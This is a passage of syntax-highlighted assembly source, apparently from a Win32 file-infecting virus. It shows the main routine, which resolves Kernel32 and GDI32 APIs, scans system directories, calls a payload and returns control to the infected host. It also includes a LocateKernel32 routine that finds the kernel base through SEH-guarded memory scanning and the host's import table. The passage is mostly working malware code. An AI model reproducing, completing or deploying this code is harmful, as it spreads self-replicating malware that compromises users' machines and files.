       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApiAddresses</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdi32_name</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Locate GDI32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">                       </span><span class="sc1">; module base</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g32_API_names</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; and the corresp.</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g32_API_addrs</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; API addresses</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApiAddresses</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckSystem</span><span class="sc0">                            </span><span class="sc1">; retrive HDD names</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">curdir</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; save the current dir</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetInitialKey</span><span class="sc0">                          </span><span class="sc1">; Edi will point to the</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------; last directory checked.</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_paths</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; If the key didn't exist</span><span class="sc0">
       </span><span class="sc5">scan_current_path</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; it gets created. Then</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; we make eax to point to</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; the right drive letter</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_go</span><span class="sc0">                                    </span><span class="sc1">; in the system paths</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">scan_current_path</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">ok_go</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateNextDirectory</span><span class="sc0">                    </span><span class="sc1">; and then we search...</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetSubsequentKey</span><span class="sc0">                       </span><span class="sc1">; set the new key</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">curdir</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; restore the current dir</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Payload</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                            </span><span class="sc1">; return to host</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Locate Kernel32 base address                                           Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  EAX = dword on stack at startup</span><span class="sc0">
</span><span class="sc1">;         EDX = pointer to kernel32 name</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: EAX = base address of kernel32 if success</span><span class="sc0">
</span><span class="sc1">;         EAX = 0, CF set if fail</span><span class="sc0">

</span><span class="sc5">LocateKernel32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">; save all registers</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">try_method_2_error</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; first set up a seh</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">; frame so that if our</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; first method crashes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">; we will find ourselves</span><span class="sc0">
                                                   </span><span class="sc1">; in the second method</span><span class="sc0">
</span><span class="sc5">locateloop</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0b4h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; first method looks for</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_k32_kill_seh</span><span class="sc0">                       </span><span class="sc1">; the k32 by checking for</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; the equal dword at 0b4</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">try_method_2</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locateloop</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_k32_kill_seh</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; if we found it, then we</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; must destroy the temp</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; seh frame</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save k32 base in DR0</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">found_k32</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">try_method_2_error</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; if the first method gave</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">; and exception error we</span><span class="sc0">
                                                   </span><span class="sc1">; must restore the stack</span><span class="sc0">
</span><span class="sc5">try_method_2</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; restore the seh state</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">; restore registers and</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">; save them again</span><span class="sc0">
                                                   </span><span class="sc1">; and go on w/ method two</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; now put imagebase in ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">                    </span><span class="sc1">; check if it is an EXE</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notfound_k32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get pointer to PE</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                              </span><span class="sc1">; too far away?</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">notfound_k32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">                    </span><span class="sc1">; is it a PE?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notfound_k32</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0">             </span><span class="sc1">; skip header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_Import.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; and get import RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_Import.DD_Size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; and import size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; save RVA</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">locateloop2</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ID_Name</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get the name</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0">                 </span><span class="sc1">; and compare to KERN</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_the_kernel_import</span><span class="sc0">                  </span><span class="sc1">; if it is not that one</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR_SIZE</span><span class="sc0">       </span><span class="sc1">; skip to the next desc.</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; but not beyond the size</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">notfound_k32</span><span class="sc0">                            </span><span class="sc1">; of the descriptor</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locateloop2</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_the_kernel_import</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; if we found the kernel</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; import descriptor</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; take the pointer to</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; addresses</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ID_Characteristics</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; and the pointer to</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; names</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gha_locate_loop</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">; save pointer to names</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.TD_AddressOfData</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; go to the actual thunk</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">; and skip the hint</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; save these</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">getmodulehandle</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; and point the name of</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">getmodulehandlelen</span><span class="sc0">                 </span><span class="sc1">; GetModuleHandleA</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                                   </span><span class="sc1">; see if it is that one</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_getmodulehandle</span><span class="sc0">                    </span><span class="sc1">; if so...</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">; otherwise restore</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">; restore arrays indexes</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; and skip to next</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; 0? -&gt; end of import</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">notfound_k32</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gha_locate_loop</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_getmodulehandle</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">; restore stack</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">; push kernel32 name</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">; esi = GetModuleHandleA</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">; address...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; DR0 holds k32 base!!</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">notfound_k32</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_k32</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">; restore all regs and</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">                                </span><span class="sc1">; put k32 in EAX</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">; and mark success</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">notfound_k32</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">; restore all regs</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; and mark the failure...</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LocateKernel32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Locate GetProcAddress                                                  Û</span><span class="sc0">
